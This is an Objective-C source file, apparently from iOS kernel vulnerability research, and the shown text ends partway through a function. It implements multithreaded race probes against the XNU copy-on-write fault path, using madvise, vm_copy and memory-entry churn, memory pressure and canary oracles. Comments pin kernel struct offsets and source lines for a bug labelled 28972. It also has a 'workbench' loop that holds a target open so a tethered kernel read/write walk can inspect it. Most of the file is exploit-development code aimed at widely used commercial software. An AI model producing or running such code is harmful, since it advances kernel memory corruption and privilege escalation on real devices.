#import "CowTruncProbe.h"

#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdatomic.h>
#import <string.h>
#import <sys/mman.h>
#import <sys/stat.h>
#import <unistd.h>

/* <mach/mach_vm.h> is unsupported on iOS; these libsystem_kernel MIG stubs
 * are exported and link fine (standard jailbreak practice). Types come via
 * <mach/mach.h>. */
extern vm_size_t vm_page_size;
extern kern_return_t mach_vm_deallocate(vm_map_t target,
                                        mach_vm_address_t address,
                                        mach_vm_size_t size);
extern kern_return_t mach_vm_map(vm_map_t target_task,
                                 mach_vm_address_t *address,
                                 mach_vm_size_t size,
                                 mach_vm_offset_t mask,
                                 int flags,
                                 mem_entry_name_port_t object,
                                 memory_object_offset_t offset,
                                 boolean_t copy,
                                 vm_prot_t cur_protection,
                                 vm_prot_t max_protection,
                                 vm_inherit_t inheritance);
extern kern_return_t mach_vm_copy(vm_map_t target_task,
                                  mach_vm_address_t source_address,
                                  mach_vm_size_t size,
                                  mach_vm_address_t dest_address);
extern kern_return_t mach_vm_allocate(vm_map_t target,
                                      mach_vm_address_t *address,
                                      mach_vm_size_t size,
                                      int flags);

/*
 * 23F77 / A14 26.5: vo_copy still @+0x38; vo_copy_version is u64 @+0x40
 * (XR 22H311 was u32 — that 28972 width bug is already hardened on 26.5).
 * This probe remains a CoW contention diagnostic; do not expect XR-era
 * u32 wrap. See A14_23F77_LabOffsets.h.
 *
 * File-offset geometry (FO_HI=4GB) still exercises aliasing under a 32-bit
 * trunc if any path remains; on 26.5 the kernel compare is full u64.
 */

#define T018_MAGIC        0x54303138434f5754ULL /* "T018COWT" */
#define FILE_SPAN         0x101200000ULL        /* 4 GB + 18 MB, sparse — must
                                                 * cover FO_HI + V3_WIN or
                                                 * high pages SIGBUS at EOF */
#define WIN               0x100000ULL           /* 1 MB mapping windows */
#define FO_HI             0x100000000ULL        /* file offset 4 GB */
#define FO_LO             0x0ULL
#define PG                0x10000ULL            /* page inside each window */
#define ITERS_CONTROL     400
#define ITERS_RACE        3000
#define LIVE_CHECK_EVERY  64
#define TIME_BUDGET_SEC   90.0

typedef struct {
    uint64_t magic;
    uint64_t iter;
    uint64_t off_tag;
    uint64_t fill[5];
} canary_t;

typedef struct {
    uint8_t *mapP;          /* MAP_PRIVATE RW window @ FO_HI — fault target */
    uint8_t *oraHi;         /* MAP_SHARED RO window @ FO_HI — oracle */
    uint8_t *oraLo;         /* MAP_SHARED RO window @ FO_LO — alias oracle */
    size_t   page;
    atomic_int stop;
    atomic_int strategy;    /* 0=idle 1=madvise 2=vm_copy 3=mementry 4=copymat 5=copymat+pressure */
    atomic_int pressure_on;
    atomic_uint_fast64_t mut_ops;
    atomic_uint_fast64_t mut_fails;
    atomic_uint_fast64_t pressure_ops;
} race_ctx_t;

/* Dual sink: on-screen result string + panic-surviving log fd. */
static NSMutableString *g_out;
static int g_logfd = -1;

/* Log/backing directory: app container when run from the app; T018_DIR env
 * (or /mnt2/root/t018 fallback) for the ramdisk CLI build. */
static NSString *t018_basedir(void)
{
    const char *env = getenv("T018_DIR");
    if (env && *env) {
        mkdir(env, 0755);
        return [NSString stringWithUTF8String:env];
    }
    NSURL *docs = [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory
                                                         inDomains:NSUserDomainMask].firstObject;
    if (docs)
        return docs.path;
    const char *fb = "/mnt2/root/t018";
    mkdir(fb, 0755);
    return [NSString stringWithUTF8String:fb];
}

static void t018_log(BOOL sync, const char *fmt, ...)
    __attribute__((format(printf, 2, 3)));
static void t018_log(BOOL sync, const char *fmt, ...)
{
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    [g_out appendFormat:@"%s\n", buf];
    static int mirror = -1;
    if (mirror < 0)
        mirror = getenv("T018_STDOUT") ? 1 : 0;
    if (mirror) {
        fputs(buf, stderr);
        fputc('\n', stderr);
        fflush(stderr);
    }
    if (g_logfd >= 0) {
        size_t n = strlen(buf);
        (void)!write(g_logfd, buf, n);
        (void)!write(g_logfd, "\n", 1);
        if (sync)
            fcntl(g_logfd, F_FULLFSYNC);
    }
}

static void canary_fill(canary_t *c, uint64_t iter, uint64_t off_tag)
{
    c->magic   = T018_MAGIC;
    c->iter    = iter;
    c->off_tag = off_tag;
    for (int i = 0; i < 5; i++)
        c->fill[i] = T018_MAGIC ^ (iter * 0x9e3779b97f4a7c15ULL) ^ (uint64_t)i;
}

static int canary_present(const uint8_t *page)
{
    return ((const canary_t *)page)->magic == T018_MAGIC;
}

static void *mutator_main(void *arg)
{
    race_ctx_t *ctx = arg;
    mach_port_t self = mach_task_self();
    uint8_t *scratch = mmap(NULL, ctx->page, PROT_READ | PROT_WRITE,
                            MAP_ANON | MAP_PRIVATE, -1, 0);
    if (scratch == MAP_FAILED)
        return NULL;

    while (!atomic_load_explicit(&ctx->stop, memory_order_relaxed)) {
        int s = atomic_load_explicit(&ctx->strategy, memory_order_relaxed);
        switch (s) {
        case 1: /* concurrent re-arm of the fault page (DirtyCow shape) */
            madvise(ctx->mapP + PG, ctx->page, MADV_DONTNEED);
            atomic_fetch_add(&ctx->mut_ops, 1);
            break;

        case 2: { /* copy-path churn on the faulting object */
            kern_return_t kr = mach_vm_copy(self,
                                            (mach_vm_address_t)(ctx->mapP + PG),
                                            ctx->page,
                                            (mach_vm_address_t)scratch);
            if (kr == KERN_SUCCESS)
                atomic_fetch_add(&ctx->mut_ops, 1);
            else
                atomic_fetch_add(&ctx->mut_fails, 1);
            break;
        }

        case 3: { /* memory-entry map/unmap churn on the faulting object */
            mach_vm_size_t esz = WIN;
            mach_port_t entry = MACH_PORT_NULL;
            kern_return_t kr = mach_make_memory_entry_64(
                self, &esz, (mach_vm_address_t)ctx->mapP,
                VM_PROT_READ, &entry, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) {
                atomic_fetch_add(&ctx->mut_fails, 1);
                break;
            }
            mach_vm_address_t dst = 0;
            kr = mach_vm_map(self, &dst, esz, 0, VM_FLAGS_ANYWHERE,
                             entry, 0, TRUE,
                             VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
            if (kr == KERN_SUCCESS)
                mach_vm_deallocate(self, dst, esz);
            mach_port_deallocate(self, entry);
            atomic_fetch_add(&ctx->mut_ops, 1);
            break;
        }

        case 4: /* copy + MATERIALIZE: every cycle flips O->copy (copy_delay)
                 * and the materializing write forces vm_object_shadow(O) —
                 * direct churn on the revalidated +0x38/+0x40 pair */
        case 5: { /* same as 4; run_phase adds the pressure thread */
            kern_return_t kr = mach_vm_copy(self,
                                            (mach_vm_address_t)(ctx->mapP + PG),
                                            ctx->page,
                                            (mach_vm_address_t)scratch);
            if (kr == KERN_SUCCESS) {
                *(volatile uint8_t *)scratch = 0x41; /* materialize the copy */
                atomic_fetch_add(&ctx->mut_ops, 1);
            } else {
                atomic_fetch_add(&ctx->mut_fails, 1);
            }
            break;
        }

        default:
            usleep(1000);
            break;
        }
    }

    munmap(scratch, ctx->page);
    return NULL;
}

/* Compressor/reclaim churn: keeps the pager busy so fault windows widen and
 * shadow collapse/pageout events fire mid-race. Ring stays MADV_FREE'd so
 * footprint stays jetsam-safe. */
static void *pressure_main(void *arg)
{
    race_ctx_t *ctx = arg;
    const size_t chunk = 16 * 1024 * 1024;
    uint8_t *ring[4] = {0};
    int i = 0;
    while (!atomic_load_explicit(&ctx->stop, memory_order_relaxed)) {
        if (!atomic_load_explicit(&ctx->pressure_on, memory_order_relaxed)) {
            usleep(2000);
            continue;
        }
        if (!ring[i])
            ring[i] = mmap(NULL, chunk, PROT_READ | PROT_WRITE,
                           MAP_ANON | MAP_PRIVATE, -1, 0);
        if (ring[i] && ring[i] != MAP_FAILED) {
            for (size_t off = 0; off < chunk; off += ctx->page)
                ring[i][off] = (uint8_t)off;
            madvise(ring[i], chunk, MADV_FREE);
            atomic_fetch_add(&ctx->pressure_ops, 1);
        }
        i = (i + 1) & 3;
    }
    for (int k = 0; k < 4; k++)
        if (ring[k] && ring[k] != MAP_FAILED)
            munmap(ring[k], chunk);
    return NULL;
}

/* Scan oracle pages for any canary. Anomaly lines get F_FULLFSYNC. */
static int oracle_check(race_ctx_t *ctx, const char *tag,
                        uint64_t *wrong_hi, uint64_t *wrong_lo)
{
    int found = 0;
    if (canary_present(ctx->oraHi + PG)) {
        canary_t c; memcpy(&c, ctx->oraHi + PG, sizeof(c));
        t018_log(YES, "[!] WRONG-SHARED @file 0x%llx (%s): iter=%llu",
                 FO_HI + PG, tag, (unsigned long long)c.iter);
        (*wrong_hi)++;
        found = 1;
    }
    if (canary_present(ctx->oraLo + PG)) {
        canary_t c; memcpy(&c, ctx->oraLo + PG, sizeof(c));
        t018_log(YES, "[!] WRONG-SHARED @file 0x%llx (%s): iter=%llu — 4GB alias hit",
                 FO_LO + PG, tag, (unsigned long long)c.iter);
        (*wrong_lo)++;
        found = 1;
    }
    return found;
}

static int run_phase(race_ctx_t *ctx, const char *name,
                     int strategy, int iters, CFAbsoluteTime deadline)
{
    uint64_t wrong_hi = 0, wrong_lo = 0;
    uint64_t faults = 0;
    canary_t c;

    uint64_t ops0 = (uint64_t)atomic_load(&ctx->mut_ops);
    uint64_t pops0 = (uint64_t)atomic_load(&ctx->pressure_ops);

    atomic_store(&ctx->pressure_on, strategy == 5);
    atomic_store(&ctx->strategy, strategy);
    t018_log(YES, "[*] phase %s: strategy=%d iters=%d", name, strategy, iters);

    for (int i = 0; i < iters; i++) {
        if (CFAbsoluteTimeGetCurrent() > deadline) {
            t018_log(YES, "[*] %s: time budget hit at iter %d", name, i);
            break;
        }

        madvise(ctx->mapP + PG, ctx->page, MADV_DONTNEED);
        canary_fill(&c, (uint64_t)i, FO_HI + PG);
        memcpy(ctx->mapP + PG, &c, sizeof(c));   /* the CoW write fault */
        faults++;

        if ((i % LIVE_CHECK_EVERY) == (LIVE_CHECK_EVERY - 1)) {
            if (oracle_check(ctx, "live", &wrong_hi, &wrong_lo))
                break; /* anomaly: stop the phase, keep the evidence */
        }
    }

    /* settle, then final oracle pass for this phase */
    usleep(20000);
    oracle_check(ctx, "final", &wrong_hi, &wrong_lo);
    atomic_store(&ctx->strategy, 0);
    atomic_store(&ctx->pressure_on, 0);

    t018_log(YES,
             "[*] %s done: faults=%llu wrong_shared_hi=%llu wrong_shared_lo=%llu "
             "mut_ops=+%llu mut_fails=%llu pressure_ops=+%llu",
             name, (unsigned long long)faults,
             (unsigned long long)wrong_hi, (unsigned long long)wrong_lo,
             (unsigned long long)atomic_load(&ctx->mut_ops) - ops0,
             (unsigned long long)atomic_load(&ctx->mut_fails),
             (unsigned long long)atomic_load(&ctx->pressure_ops) - pops0);

    return (wrong_hi || wrong_lo) ? 1 : 0;
}

@implementation CowTruncProbe

+ (NSString *)runCowTruncRace
{
    race_ctx_t ctx = {0};
    ctx.page = (size_t)vm_page_size;
    atomic_store(&ctx.stop, 0);
    atomic_store(&ctx.strategy, 0);

    g_out = [NSMutableString string];

    NSString *base = t018_basedir();
    NSString *lpath = [base stringByAppendingPathComponent:@"t018_cow_log.txt"];
    g_logfd = open(lpath.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    t018_log(YES, "=== T018 vm_fault CoW trunc probe (28972) ===");
    t018_log(YES, "[*] page=0x%zx win=0x%llx fault@file 0x%llx alias@file 0x%llx",
             ctx.page, WIN, FO_HI + PG, FO_LO + PG);

    /* sparse backing file in our own container */
    NSString *fpath = [base stringByAppendingPathComponent:@"t018_backing.bin"];
    unlink(fpath.fileSystemRepresentation);
    int fd = open(fpath.fileSystemRepresentation, O_RDWR | O_CREAT, 0600);
    if (fd < 0) {
        t018_log(YES, "[x] open backing: errno=%d", errno);
        goto fail;
    }
    if (ftruncate(fd, (off_t)FILE_SPAN) != 0) {
        t018_log(YES, "[x] ftruncate(0x%llx): errno=%d", FILE_SPAN, errno);
        close(fd);
        goto fail;
    }

    /* small windows at high file offsets — no giant VA span needed */
    ctx.mapP = mmap(NULL, WIN, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, (off_t)FO_HI);
    if (ctx.mapP == MAP_FAILED) {
        t018_log(YES, "[x] mapP private @fo 0x%llx: errno=%d", FO_HI, errno);
        close(fd);
        goto fail;
    }
    ctx.oraHi = mmap(NULL, WIN, PROT_READ, MAP_SHARED, fd, (off_t)FO_HI);
    if (ctx.oraHi == MAP_FAILED) {
        t018_log(YES, "[x] oraHi shared @fo 0x%llx: errno=%d", FO_HI, errno);
        close(fd);
        munmap(ctx.mapP, WIN);
        goto fail;
    }
    ctx.oraLo = mmap(NULL, WIN, PROT_READ, MAP_SHARED, fd, (off_t)FO_LO);
    if (ctx.oraLo == MAP_FAILED) {
        t018_log(YES, "[x] oraLo shared @fo 0x%llx: errno=%d", FO_LO, errno);
        close(fd);
        munmap(ctx.mapP, WIN);
        munmap(ctx.oraHi, WIN);
        goto fail;
    }
    close(fd);
    unlink(fpath.fileSystemRepresentation); /* mappings stay valid; no 4 GB litter */
    t018_log(YES, "[*] mapP=%p oraHi=%p oraLo=%p", ctx.mapP, ctx.oraHi, ctx.oraLo);

    /* fault the oracle pages in once so live checks don't pagein mid-race */
    (void)*(volatile uint8_t *)(ctx.oraHi + PG);
    (void)*(volatile uint8_t *)(ctx.oraLo + PG);

    {
        pthread_t mut, pres;
        int have_mut = (pthread_create(&mut, NULL, mutator_main, &ctx) == 0);
        int have_pres = (pthread_create(&pres, NULL, pressure_main, &ctx) == 0);

        CFAbsoluteTime deadline = CFAbsoluteTimeGetCurrent() + TIME_BUDGET_SEC;
        int anomaly = 0;

        /* control: no mutation — must stay clean */
        anomaly |= run_phase(&ctx, "control", 0, ITERS_CONTROL, deadline);

        /* v2 race phases first: copy+materialize churns the faulting object's
         * revalidated pair directly; pressure adds collapse/pageout events */
        if (!anomaly) anomaly |= run_phase(&ctx, "race-copymat",          4, ITERS_RACE, deadline);
        if (!anomaly) anomaly |= run_phase(&ctx, "race-copymat-pressure", 5, ITERS_RACE, deadline);

        /* v1 phases, kept for comparison if budget remains */
        if (!anomaly) anomaly |= run_phase(&ctx, "race-madvise",  1, ITERS_RACE, deadline);
        if (!anomaly) anomaly |= run_phase(&ctx, "race-vmcopy",   2, ITERS_RACE, deadline);
        if (!anomaly) anomaly |= run_phase(&ctx, "race-mementry", 3, ITERS_RACE, deadline);

        if (have_mut || have_pres) {
            atomic_store(&ctx.stop, 1);
            if (have_mut)  pthread_join(mut, NULL);
            if (have_pres) pthread_join(pres, NULL);
        }

        t018_log(YES, "=== verdict: %s ===",
                 anomaly ? "WRONG-page anomaly — 28972 geometry confusion LIVE"
                         : "clean v2 — pair not moved from app; P0 workbench next");

        munmap(ctx.mapP, WIN);
        munmap(ctx.oraHi, WIN);
        munmap(ctx.oraLo, WIN);
        close(g_logfd);
        g_logfd = -1;
        return [g_out copy];
    }

fail:
    if (g_logfd >= 0) {
        close(g_logfd);
        g_logfd = -1;
    }
    return [g_out copy];
}

/* ================= v3: shadow-chain race =================
 * v1/v2 faulted a single-level private object (shadow == NULL). The recheck
 * at 0xf02f7c guards CoW state on a *shadowed* object, so v3 first builds a
 * real shadow (big vm_copy + full materialization → vm_object_shadow(O1)),
 * then races parallel re-faults against big-copy churn + collapse pressure.
 * Primary oracle is the "unexpected CoW" PANIC itself: its arguments print
 * the live vs saved pair — naming +0x40 with no KRW. Secondary: the
 * shared-page canary oracle from v1/v2.
 */

#define V3_WIN        0x1000000ULL   /* 16 MB private window @ FO_HI */
#define V3_COPY_LEN   0x800000ULL    /* 8 MB copy chunk (shadow material) */
#define V3_FAULTERS   3
#define V3_MUTATORS   2
#define V3_TIME_SEC   90.0

typedef struct {
    uint8_t *mapP, *oraHi, *oraLo;
    size_t   page;
    atomic_int stop;
    atomic_uint_fast64_t faults, copy_ops, pressure_ops, wrong;
} v3_ctx_t;

typedef struct { v3_ctx_t *ctx; int tid; } v3_targ_t;

static int v3_oracle(v3_ctx_t *ctx, const char *tag)
{
    int found = 0;
    if (canary_present(ctx->oraHi)) {
        canary_t c; memcpy(&c, ctx->oraHi, sizeof(c));
        t018_log(YES, "[!] WRONG-SHARED @file 0x%llx (%s): iter=%llu",
                 FO_HI + PG, tag, (unsigned long long)c.iter);
        atomic_fetch_add(&ctx->wrong, 1);
        found = 1;
    }
    if (canary_present(ctx->oraLo)) {
        canary_t c; memcpy(&c, ctx->oraLo, sizeof(c));
        t018_log(YES, "[!] WRONG-SHARED @file 0x%llx (%s): iter=%llu — 4GB alias hit",
                 FO_LO + PG, tag, (unsigned long long)c.iter);
        atomic_fetch_add(&ctx->wrong, 1);
        found = 1;
    }
    return found;
}

static void *v3_faulter(void *arg)
{
    v3_targ_t *ta = arg;
    v3_ctx_t *ctx = ta->ctx;
    size_t pg = ctx->page;
    int total = (int)(V3_WIN / pg);
    int per = total / V3_FAULTERS;
    int lo = ta->tid * per;
    int hi = (ta->tid == V3_FAULTERS - 1) ? total : lo + per;
    canary_t c;
    uint64_t i = 0;

    while (!atomic_load_explicit(&ctx->stop, memory_order_relaxed)) {
        for (int p = lo; p < hi; p++) {
            if (atomic_load_explicit(&ctx->stop, memory_order_relaxed))
                break;
            uint8_t *va = ctx->mapP + (uint64_t)p * pg;
            madvise(va, pg, MADV_DONTNEED);
            canary_fill(&c, i, FO_HI + (uint64_t)p * pg);
            memcpy(va, &c, sizeof(c));   /* CoW write fault through the shadow chain */
            i++;
            atomic_fetch_add(&ctx->faults, 1);
            if ((i & 0xFF) == 0 && v3_oracle(ctx, "live"))
                atomic_store(&ctx->stop, 1);
        }
    }
    return NULL;
}

static void *v3_mutator(void *arg)
{
    v3_targ_t *ta = arg;
    v3_ctx_t *ctx = ta->ctx;
    mach_port_t self = mach_task_self();
    size_t pg = ctx->page;
    uint8_t *scratch = mmap(NULL, V3_COPY_LEN, PROT_READ | PROT_WRITE,
                            MAP_ANON | MAP_PRIVATE, -1, 0);
    if (scratch == MAP_FAILED)
        return NULL;

    uint64_t rot = 0;
    while (!atomic_load_explicit(&ctx->stop, memory_order_relaxed)) {
        /* big copy from O1: copy_delay sets O1->copy every cycle */
        mach_vm_address_t src = (mach_vm_address_t)(ctx->mapP + (rot % (V3_WIN / 2)));
        kern_return_t kr = mach_vm_copy(self, src, V3_COPY_LEN,
                                        (mach_vm_address_t)scratch);
        if (kr == KERN_SUCCESS) {
            /* materialize every page: shadow/copy-object churn on O1 */
            for (uint64_t off = 0; off < V3_COPY_LEN; off += pg)
                scratch[off] = 0x42;
            atomic_fetch_add(&ctx->copy_ops, 1);
        }
        rot += V3_COPY_LEN;
    }
    munmap(scratch, V3_COPY_LEN);
    return NULL;
}

static void *v3_pressure(void *arg)
{
    v3_ctx_t *ctx = arg;
    const size_t chunk = 16 * 1024 * 1024;
    uint8_t *ring[4] = {0};
    int i = 0;
    while (!atomic_load_explicit(&ctx->stop, memory_order_relaxed)) {
        if (!ring[i])
            ring[i] = mmap(NULL, chunk, PROT_READ | PROT_WRITE,
                           MAP_ANON | MAP_PRIVATE, -1, 0);
        if (ring[i] && ring[i] != MAP_FAILED) {
            for (size_t off = 0; off < chunk; off += ctx->page)
                ring[i][off] = (uint8_t)off;
            madvise(ring[i], chunk, MADV_FREE);
            atomic_fetch_add(&ctx->pressure_ops, 1);
        }
        i = (i + 1) & 3;
    }
    for (int k = 0; k < 4; k++)
        if (ring[k] && ring[k] != MAP_FAILED)
            munmap(ring[k], chunk);
    return NULL;
}

/* P0 workbench target: stable infinite copymat fault loop so the tethered
 * ramdisk side has time to walk the vm_map and watch the object live.
 * First log line carries everything the KRW walk needs. */
+ (NSString *)runCowTruncWorkbench
{
    race_ctx_t ctx = {0};
    ctx.page = (size_t)vm_page_size;
    atomic_store(&ctx.stop, 0);
    atomic_store(&ctx.strategy, 4); /* copymat churn, forever */

    g_out = [NSMutableString string];

    NSString *base = t018_basedir();
    NSString *lpath = [base stringByAppendingPathComponent:@"t018_cow_log.txt"];
    g_logfd = open(lpath.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    NSString *fpath = [base stringByAppendingPathComponent:@"t018_backing.bin"];
    unlink(fpath.fileSystemRepresentation);
    int fd = open(fpath.fileSystemRepresentation, O_RDWR | O_CREAT, 0600);
    if (fd < 0 || ftruncate(fd, (off_t)FILE_SPAN) != 0) {
        t018_log(YES, "[x] workbench backing setup: errno=%d", errno);
        if (fd >= 0) close(fd);
        if (g_logfd >= 0) { close(g_logfd); g_logfd = -1; }
        return [g_out copy];
    }
    ctx.mapP = mmap(NULL, WIN, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, (off_t)FO_HI);
    close(fd);
    if (ctx.mapP == MAP_FAILED) {
        t018_log(YES, "[x] workbench mapP: errno=%d", errno);
        if (g_logfd >= 0) { close(g_logfd); g_logfd = -1; }
        return [g_out copy];
    }
    unlink(fpath.fileSystemRepresentation);

    /* the line the ramdisk side walks from */
    t018_log(YES,
             "=== T018 WORKBENCH TARGET pid=%d mapP=%p fault_va=%p page=0x%zx fo=0x%llx ===",
             getpid(), ctx.mapP, ctx.mapP + PG, ctx.page, FO_HI + PG);

    pthread_t mut;
    pthread_create(&mut, NULL, mutator_main, &ctx);

    canary_t c;
    for (uint64_t i = 0;; i++) {
        madvise(ctx.mapP + PG, ctx.page, MADV_DONTNEED);
        canary_fill(&c, i, FO_HI + PG);
        memcpy(ctx.mapP + PG, &c, sizeof(c));   /* the CoW write fault */
        if ((i & 0x1FFF) == 0x1FFF)
            t018_log(YES, "[wb] iter=%llu mapP=%p", (unsigned long long)i, ctx.mapP);
    }
    /* never returns — force-quit to stop */
}

+ (NSString *)runCowTruncShadowRace
{
    v3_ctx_t ctx = {0};
    ctx.page = (size_t)vm_page_size;
    atomic_store(&ctx.stop, 0);

    g_out = [NSMutableString string];

    NSString *base = t018_basedir();
    NSString *lpath = [base stringByAppendingPathComponent:@"t018_cow_log.txt"];
    g_logfd = open(lpath.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    t018_log(YES, "=== T018 v3 shadow-chain race (28972) ===");
    t018_log(YES, "[*] PRIMARY ORACLE = the 'unexpected CoW' panic itself:");
    t018_log(YES, "    its args print live vs saved pair — names +0x40, no KRW");
    t018_log(YES, "[*] page=0x%zx win=0x%llx copylen=0x%llx fault@file 0x%llx",
             ctx.page, V3_WIN, V3_COPY_LEN, FO_HI + PG);

    NSString *fpath = [base stringByAppendingPathComponent:@"t018_backing.bin"];
    unlink(fpath.fileSystemRepresentation);
    int fd = open(fpath.fileSystemRepresentation, O_RDWR | O_CREAT, 0600);
    if (fd < 0 || ftruncate(fd, (off_t)FILE_SPAN) != 0) {
        t018_log(YES, "[x] backing setup: errno=%d", errno);
        if (fd >= 0) close(fd);
        goto v3_fail;
    }

    ctx.mapP = mmap(NULL, V3_WIN, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, (off_t)FO_HI);
    if (ctx.mapP == MAP_FAILED) {
        t018_log(YES, "[x] mapP: errno=%d", errno);
        close(fd);
        goto v3_fail;
    }
    /* one-page shared oracles at the two low-32-alias file offsets */
    ctx.oraHi = mmap(NULL, ctx.page, PROT_READ, MAP_SHARED, fd, (off_t)(FO_HI + PG));
    ctx.oraLo = mmap(NULL, ctx.page, PROT_READ, MAP_SHARED, fd, (off_t)(FO_LO + PG));
    close(fd);
    unlink(fpath.fileSystemRepresentation);
    if (ctx.oraHi == MAP_FAILED || ctx.oraLo == MAP_FAILED) {
        t018_log(YES, "[x] oracle maps failed");
        goto v3_fail;
    }
    (void)*(volatile uint8_t *)ctx.oraHi;
    (void)*(volatile uint8_t *)ctx.oraLo;
    t018_log(YES, "[*] mapP=%p oraHi=%p oraLo=%p", ctx.mapP, ctx.oraHi, ctx.oraLo);

    /* Establish the shadow on O1: dirty a page, then big copy + full
     * materialization → vm_object_shadow(O1); pager moves to O2. */
    {
        canary_t c;
        canary_fill(&c, 0, FO_HI + PG);
        memcpy(ctx.mapP + PG, &c, sizeof(c));

        uint8_t *s0 = mmap(NULL, V3_COPY_LEN, PROT_READ | PROT_WRITE,
                           MAP_ANON | MAP_PRIVATE, -1, 0);
        if (s0 == MAP_FAILED) {
            t018_log(YES, "[x] shadow scratch map failed");
            goto v3_fail;
        }
        kern_return_t kr = mach_vm_copy(mach_task_self(),
                                        (mach_vm_address_t)ctx.mapP, V3_COPY_LEN,
                                        (mach_vm_address_t)s0);
        t018_log(YES, "[*] shadow-establish vm_copy kr=%d (%s)", kr,
                 kr == KERN_SUCCESS ? "ok" : "FAILED — shadow unlikely");
        if (kr == KERN_SUCCESS) {
            for (uint64_t off = 0; off < V3_COPY_LEN; off += ctx.page)
                s0[off] = 0x42;   /* materialize → vm_object_shadow(O1) */
            t018_log(YES, "[*] materialized %llu pages — O1 shadowed (if copy_delay path taken)",
                     V3_COPY_LEN / (uint64_t)ctx.page);
        }
        munmap(s0, V3_COPY_LEN);
    }

    {
        pthread_t ft[V3_FAULTERS], mt[V3_MUTATORS], pt;
        v3_targ_t fa[V3_FAULTERS], ma[V3_MUTATORS];
        for (int i = 0; i < V3_FAULTERS; i++) {
            fa[i] = (v3_targ_t){ &ctx, i };
            pthread_create(&ft[i], NULL, v3_faulter, &fa[i]);
        }
        for (int i = 0; i < V3_MUTATORS; i++) {
            ma[i] = (v3_targ_t){ &ctx, i };
            pthread_create(&mt[i], NULL, v3_mutator, &ma[i]);
        }
        pthread_create(&pt, NULL, v3_pressure, &ctx);

        CFAbsoluteTime deadline = CFAbsoluteTimeGetCurrent() + V3_TIME_SEC;
        while (CFAbsoluteTimeGetCurrent() < deadline &&
               !atomic_load_explicit(&ctx.stop, memory_order_relaxed)) {
            usleep(100000);
            if (v3_oracle(&ctx, "main"))
                atomic_store(&ctx.stop, 1);
        }
        atomic_store(&ctx.stop, 1);
        for (int i = 0; i < V3_FAULTERS; i++) pthread_join(ft[i], NULL);
        for (int i = 0; i < V3_MUTATORS; i++) pthread_join(mt[i], NULL);
        pthread_join(pt, NULL);
    }

    v3_oracle(&ctx, "final");
    t018_log(YES,
             "[*] v3 done: faults=%llu copy_ops=%llu pressure_ops=%llu wrong=%llu",
             (unsigned long long)atomic_load(&ctx.faults),
             (unsigned long long)atomic_load(&ctx.copy_ops),
             (unsigned long long)atomic_load(&ctx.pressure_ops),
             (unsigned long long)atomic_load(&ctx.wrong));
    t018_log(YES, "=== verdict: %s ===",
             atomic_load(&ctx.wrong)
                 ? "WRONG-page anomaly — 28972 geometry confusion LIVE"
                 : "clean v3 — shadowed shape didn't fire either; P0/E2 decides");

    munmap(ctx.mapP, V3_WIN);
    munmap(ctx.oraHi, ctx.page);
    munmap(ctx.oraLo, ctx.page);
    close(g_logfd);
    g_logfd = -1;
    return [g_out copy];

v3_fail:
    if (g_logfd >= 0) {
        close(g_logfd);
        g_logfd = -1;
    }
    return [g_out copy];
}

/* ================= v4 — vo_copy_version race (source-pinned 28972 shape) ====
 *
 * Source pin (xnu 26.5 / 23F77 A14): vo_copy @+0x38, vo_copy_version @+0x40
 * as u64 (22H311 was u32; 22H355/26.x widened). XR-era 28972 u32 wrap is N/A.
 *
 * Gates driven here:
 *  - site 1 (vm_fault.c:5856, zero-fill): write-fault fresh anon pages of an
 *    object carrying vo_copy, with N faulters on the SAME object
 *    (object_is_contended -> drop-lock window across zero-fill).
 *  - site 2 (vm_fault.c:6373, main path): map write-lock churn so the
 *    faulter's vm_map_try_lock_read fails (object_locks_dropped window).
 *  - version churn: every copy_delay vm_copy bumps vo_copy_version
 *    (install vm_object.c:3907, growth :3769; clear :1354/:4812 NULLs the
 *    pointer WITHOUT bumping).
 *
 * Oracles:
 *  - WRITE-THROUGH: dst (frozen vm_copy snapshot, all zeros) shows a src
 *    canary => the recheck passed stale => 28972 LIVE (needs wrap/alias).
 *  - PANIC "unexpected CoW" on an exec-implied mapping (phase C, needs
 *    MAP_JIT/RWX allowed): fires on ANY detected mismatch there => proves
 *    the window is app-reachable WITHOUT needing the wrap.
 */

#define V4_LEN        0x4000000ULL   /* 64 MB anon region */
#define V4_FAULTERS   4
#define V4_TIME_SEC   60.0
#define V4_C_TIME_SEC 20.0
#define V4_BUMP_SPAN  0x1000000ULL   /* bumper copy window: 16 MB */
#define V4_JIT_LEN    0x400000ULL    /* 4 MB exec region for phase C */

typedef struct {
    uint8_t  *src;
    uint8_t  *dst;
    uint64_t  len;
    size_t    page;
    atomic_int stop;
    atomic_uint_fast64_t faults;
    atomic_uint_fast64_t bumps;
    atomic_uint_fast64_t cycles;
    atomic_uint_fast64_t churn_ops;
    atomic_uint_fast64_t wrong;
} v4_ctx_t;

typedef struct { v4_ctx_t *c; int id; } v4_targ_t;

static void *v4_faulter(void *arg)
{
    v4_targ_t *t = arg;
    v4_ctx_t *c = t->c;
    const size_t pg = c->page;
    const uint64_t stride = (uint64_t)V4_FAULTERS * pg;
    canary_t can;
    while (!atomic_load_explicit(&c->stop, memory_order_relaxed)) {
        for (uint64_t off = (uint64_t)t->id * pg; off < c->len; off += stride) {
            canary_fill(&can, off, 0xC0FFEE00ULL + off);
            memcpy(c->src + off, &can, sizeof(can));  /* zero-fill write fault, CoW obligation */
            atomic_fetch_add_explicit(&c->faults, 1, memory_order_relaxed);
            if (atomic_load_explicit(&c->stop, memory_order_relaxed))
                break;
        }
        /* discard our stripe: next pass re-faults as fresh zero-fill */
        for (uint64_t off = (uint64_t)t->id * pg; off < c->len; off += stride)
            madvise(c->src + off, pg, MADV_DONTNEED);
    }
    return NULL;
}

static void *v4_bumper(void *arg)
{
    v4_ctx_t *c = arg;
    const size_t pg = c->page;
    while (!atomic_load_explicit(&c->stop, memory_order_relaxed)) {
